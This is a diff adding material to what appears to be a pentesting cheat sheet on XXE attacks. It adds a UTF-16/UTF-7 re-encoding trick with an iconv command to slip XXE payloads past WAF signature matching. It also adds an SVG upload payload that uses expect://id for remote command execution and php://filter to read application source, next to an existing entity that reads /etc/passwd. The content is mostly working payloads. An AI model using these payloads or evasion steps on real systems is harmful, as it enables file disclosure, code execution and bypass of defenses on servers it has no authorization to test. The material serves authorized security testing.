@@ -578,6 +578,14 @@ sequenceDiagram
   <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:%2F%2F%2Fetc%2Fpasswd"> ]>
   ```
 
+- **Character-Encoding (UTF-16 / UTF-7)**: Convert the payload to UTF-16 so the WAF — which matches `<!ENTITY` / `<!DOCTYPE` as ASCII bytes — no longer sees those tokens, while the XML parser auto-detects the encoding from the BOM (`FE FF` for UTF-16BE) or the XML declaration and parses it normally:
+
+  ```bash
+  cat exploit.xml | iconv -f UTF-8 -t UTF-16BE > out.xml
+  ```
+
+  Submit `out.xml` as the request body. For legacy parsers that accept it, **UTF-7** (`iconv -f UTF-8 -t UTF-7`) works the same way, encoding `<` as `+ADw-` etc. to defeat ASCII signature matching.
+
 ### XXE in CDATA Sections
 
 ```xml
@@ -833,6 +841,18 @@ Create an SVG file with the payload:
 ```
 
 Upload it where SVG is allowed (e.g., profile picture, comment attachment).
+
+SVG also supports `<image xlink:href="...">`, which on PHP back-ends lets you reach stream wrappers. With the (non-default) PHP `expect` extension loaded this escalates to RCE; the `php://filter` variant reads source instead:
+
+```xml
+<?xml version="1.0" standalone="yes"?>
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <!-- RCE: requires the PHP expect:// extension -->
+  <image xlink:href="expect://id" width="200" height="200"/>
+  <!-- Source read: base64-encode any file via php://filter -->
+  <image xlink:href="php://filter/convert.base64-encode/resource=index.php" width="200" height="200"/>
+</svg>
+```
 
 #### Comprehensive XXE Testing Checklist
 
